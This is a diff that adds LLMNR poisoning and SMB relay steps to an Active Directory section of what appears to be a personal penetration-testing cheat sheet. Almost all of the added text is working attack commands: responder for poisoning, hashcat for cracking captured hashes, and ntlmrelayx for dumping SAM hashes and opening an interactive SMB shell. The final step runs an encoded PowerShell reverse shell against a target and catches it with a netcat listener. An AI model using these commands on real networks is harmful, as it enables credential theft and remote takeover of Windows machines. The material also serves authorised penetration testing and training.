@@ -459,8 +459,21 @@ Active Directory:
 .          NTDS.dit is a file that has all of the passwords. stored in %SystemRoot%\NTDS
 
 LLMNR Poisoning
-
-
+.          responder -I eth0 -dwPv
+.          dir \\<Kali_IP>\test
+.          hashcat -m <module_number> <file.hash> rockyou2021.txt --force
+SMB Relay
+.          nmap --script=smb2-security-mode.nse -p 445 10.10.10.10     (enumeration using nmap if you get 'Message singing enabled but not required' you are good to go)
+.          run responder and turn SMB & HTTP off from /etc/responder/Responder.conf
+.          responder -I eth0 -dwPv
+.    1     ntlmrelayx.py -tf targets.txt -smb2support     (put the target IP in targets.txt)
+.          dir \\<Kali_IP>\test
+.          you should have got the SAM database hashes
+.    2     ntlmrelayx.py -tf targets.txt -smb2support -i     (it will start interactive SMB client shell via TCP on 127.0.0.1:11000)
+.          dir \\<Kali_IP>\test
+.          nc 127.0.0.1 11000
+.    3     sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <payload>"     (send a powershell reverse shell payload)
+.          nc -nlvp 9001
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
